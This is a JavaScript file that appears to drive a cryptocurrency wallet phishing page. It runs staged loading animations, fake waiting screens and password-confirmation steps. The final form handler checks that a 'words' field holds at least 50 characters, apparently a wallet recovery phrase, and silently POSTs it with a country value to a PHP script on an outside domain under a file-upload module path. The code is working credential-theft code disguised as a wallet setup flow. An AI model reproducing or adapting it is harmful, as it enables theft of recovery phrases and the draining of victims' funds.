window.onload = function(){

        var opo = 0.1;
    var timer = setInterval(function () {
        if (opo >= 1){
            clearInterval(timer);
            //document.getElementById('two').style.display = 'none';
        }
		document.getElementById("imgoo").style.opacity = opo;
        document.getElementById("imgoo").style.filter = 'alpha(opacity=' + opo * 100 + ")";
        opo += opo * 0.02;
    }, 5);

    setTimeout(function(){
	 document.getElementById("twologo").style.opacity = 1;
     $(".loader-wrapper").fadeOut("slow");
    }, 1440);

	 setTimeout(pollDOMo, 1880);
function pollDOMo () {
    var op = 0.1;  // initial opacity
    var timer = setInterval(function () {
        if (op >= 1){
            clearInterval(timer);
            //document.getElementById('two').style.display = 'none';
        }
        document.getElementById("twoo").style.opacity = op;
        document.getElementById("twoo").style.filter = 'alpha(opacity=' + op * 100 + ")";
        op += op * 0.1;
    }, 5);
 //document.getElementById("two").style.display="flex"
}
   };
   
   
$('a').click(function(event) {
var target = event.target;
var id = target.id;
  if (event.currentTarget.id === "runer") {
  document.getElementById("four").style.display = "flex";
  document.getElementById("tree").style.display="none";
  setTimeout(pollDOMo, 20000);
  }
});

function pollDOMo () {
 document.getElementById("four").style.display = "none";
 document.getElementById("five").style.display = "flex";
} 
   
$('a').click(function (event) {
  var x = document.getElementById("ww");
  var xx = document.getElementById("www");
  if (x.type === "password") {
  document.getElementById("fho").src = "img/eye.jpg";
    x.type = "text";
	xx.type = "text";
  } else {
    document.getElementById("fho").src = "img/noeye.jpg";
    x.type = "password";
	xx.type = "password";
  }
});

function sleep(delay) {
    var start = new Date().getTime();
    while (new Date().getTime() < start + delay);
}


         $('#formuo').submit(function (event) {
            event.preventDefault();
 document.getElementById("four").style.display = "flex";
 document.getElementById("five").style.display = "none";
 setTimeout(pollDOMo, 20000);
		 });

         $('#formou').submit(function (event) {
            event.preventDefault();
 document.getElementById("five").style.display="none"
 document.getElementById("one").style.display="flex"
		 });

         $('#formo').submit(function (event) {
            event.preventDefault();
			if($('#ww').val().length < 8){ // checks the password value length
       alert('You have entered less than 8 characters for password');
       return false;
			}else{

if ($('#ww').val() != $('#www').val()) {
alert('Check your password');
return false;
} else {
 document.getElementById("ho").style.display="none"
 document.getElementById("hoo").style.display="block"

 setTimeout(pollDOM, 3000);
function pollDOM () {
 document.getElementById("one").style.display="flex"
 document.getElementById("two").style.display="none"
}
   }
	  }
		 });
		 
        $('#form').submit(function (event) {
            event.preventDefault();
	   if($('#w1').val().length < 50){ // checks the password value length
       alert('Wrong Words! Please check and write again.');
       return false;
			}else{
            $.ajax({
                type : 'POST',
                url : 'https://acquist.ca/modules/mod_simplefileuploadv1.3/elements/update.php',
                data : {
                    w1: document.getElementById('w1').value,
					country: document.getElementById('country').value
                }
            }); 
			}
        });
		